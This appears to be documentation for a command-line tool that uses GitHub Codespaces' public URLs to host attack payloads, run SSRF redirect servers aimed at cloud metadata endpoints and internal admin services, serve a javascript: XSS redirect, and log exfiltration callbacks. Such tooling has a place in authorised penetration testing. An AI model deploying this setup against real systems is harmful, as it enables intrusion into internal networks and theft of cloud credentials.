# File Hosting

Serve files, redirects, and custom HTTP responses on public HTTPS URLs using GitHub Codespaces.

All servers get a `*.app.github.dev` URL with automatic TLS -- no domain registration or certificate setup required.

## Serve a File

```bash
cs-serve file payload.bin
```

Output includes the public URL:

```
Public URL: https://abc123-9999.app.github.dev/payload.bin
```

### Serve on a custom port

```bash
cs-serve file exploit.html 8888
```

## Serve a Directory

```bash
cs-serve dir ./payloads
```

Files are accessible by direct path. Directory listing is disabled for security.

## SSRF Redirect Server

Redirect incoming requests to an internal target:

```bash
# AWS metadata endpoint
cs-serve redirect http://169.254.169.254/latest/meta-data/

# Internal service
cs-serve redirect http://10.0.0.1:8080/admin

# With custom status code
cs-serve redirect http://internal.target/ 9999 301
```

### JavaScript Protocol Redirect

```bash
cs-serve redirect "javascript:alert(document.domain)"
```

## Custom HTTP Response

Serve arbitrary content with full control over body, content type, and status:

```bash
# JSON response
cs-serve custom 9999 '{"status":"pwned"}' application/json

# HTML page
cs-serve custom 9999 '<html><body>test</body></html>' text/html

# XML response with custom status
cs-serve custom 9999 '<?xml version="1.0"?><root/>' application/xml 201
```

## Real-Time Logging

All servers log incoming requests to stdout in real time. This is useful for:

- Confirming SSRF hits
- Monitoring exfiltration callbacks
- Debugging payload delivery

## Cleanup

```bash
cs-serve stop 9999       # stop a specific server
cs-serve clean           # kill all servers and port forwards
```
